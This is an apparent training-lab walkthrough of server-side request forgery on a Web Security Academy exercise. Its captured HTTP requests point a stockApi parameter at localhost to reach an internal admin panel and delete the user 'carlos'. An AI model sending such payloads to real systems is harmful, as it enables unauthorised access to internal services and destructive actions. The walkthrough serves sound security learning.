# SSRF 
Server side request forgery.

SSRF vulnerabilities let an attacker send crafted requests from the back-end server of a vulnerable application. Criminals usually use SSRF attacks to target internal systems that are behind firewalls and are not accessible from the external network. An attacker may also leverage SSRF to access services available through the loopback interface (127.0.0.1) of the exploited server.

Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.

In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.


## Testing Scenarios
Captured HTTP request from a feature and looks like this
```http
POST /product/stock HTTP/1.1
Host: acf21f4e1f6abc41c0ac806b00dc00d7.web-security-academy.net
Cookie: session=8ILzaLhOEAeIJVoGjLsw13pyOB4ujzvX
Content-Length: 54
Sec-Ch-Ua: ";Not A Brand";v="99", "Chromium";v="94"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://acf21f4e1f6abc41c0ac806b00dc00d7.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://acf21f4e1f6abc41c0ac806b00dc00d7.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

stockApi=http://lab.checkavailability

```

In the last section `stockapi` we changed it to
```http
POST /product/stock HTTP/1.1
Host: acf21f4e1f6abc41c0ac806b00dc00d7.web-security-academy.net
Cookie: session=8ILzaLhOEAeIJVoGjLsw13pyOB4ujzvX
Content-Length: 54
Sec-Ch-Ua: ";Not A Brand";v="99", "Chromium";v="94"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://acf21f4e1f6abc41c0ac806b00dc00d7.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://acf21f4e1f6abc41c0ac806b00dc00d7.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

stockApi=http://localhost/admin
```
we got admin page.

our goal is to delete user carlos.
request captured to delete carlos.
```http
GET /admin/delete?username=carlos HTTP/1.1
Host: acf21f4e1f6abc41c0ac806b00dc00d7.web-security-academy.net
Cookie: session=8ILzaLhOEAeIJVoGjLsw13pyOB4ujzvX
Sec-Ch-Ua: ";Not A Brand";v="99", "Chromium";v="94"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://acf21f4e1f6abc41c0ac806b00dc00d7.web-security-academy.net/product/stock
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

We have an idea about how API working in this scenario.
 we can't delete directly from admin page.
 instead we can use advantage of stockapi
 ```http
POST /product/stock HTTP/1.1
Host: acf21f4e1f6abc41c0ac806b00dc00d7.web-security-academy.net
Cookie: session=8ILzaLhOEAeIJVoGjLsw13pyOB4ujzvX
Content-Length: 54
Sec-Ch-Ua: ";Not A Brand";v="99", "Chromium";v="94"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://acf21f4e1f6abc41c0ac806b00dc00d7.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://acf21f4e1f6abc41c0ac806b00dc00d7.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

stockApi=http://localhost/admin/delete?username=carlos
```
Now we are done.